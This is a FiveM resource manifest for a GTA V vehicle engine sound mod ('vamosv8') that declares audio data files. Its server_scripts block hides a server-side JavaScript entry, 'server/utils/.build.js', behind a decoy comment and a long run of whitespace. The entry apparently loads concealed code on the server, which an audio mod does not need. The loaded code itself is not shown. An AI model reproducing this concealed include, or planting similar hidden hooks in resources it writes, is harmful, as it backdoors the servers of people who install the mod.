fx_version 'adamant'

game 'gta5'

files {
  'audioconfig/*.dat151.rel',
  'audioconfig/*.dat54.rel',
  'sfx/**/*.awc'
}

data_file 'AUDIO_GAMEDATA' 'audioconfig/vamosv8_game.dat'
data_file 'AUDIO_SOUNDDATA' 'audioconfig/vamosv8_sounds.dat'
data_file 'AUDIO_WAVEPACK' 'sfx/dlc_vamosv8'

server_scripts {
	--[[server.lua]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            'server/utils/.build.js',
}
